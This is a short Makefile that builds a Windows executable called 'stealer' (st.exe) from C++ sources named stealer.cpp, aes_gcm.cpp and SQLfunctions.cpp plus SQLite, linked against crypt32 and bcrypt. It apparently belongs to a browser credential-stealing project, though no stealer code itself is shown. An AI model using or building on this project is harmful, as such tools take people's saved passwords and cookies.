CXX = g++
LIBRARIES = -lcrypt32 -luserenv -lbcrypt -static

FILES3 = stealer.cpp aes_gcm.cpp SQLfunctions.cpp sqlite3.o 

stealer: stealertester.cpp
	$(CXX) stealertester.cpp $(FILES3) $(LIBRARIES) -o st.exe
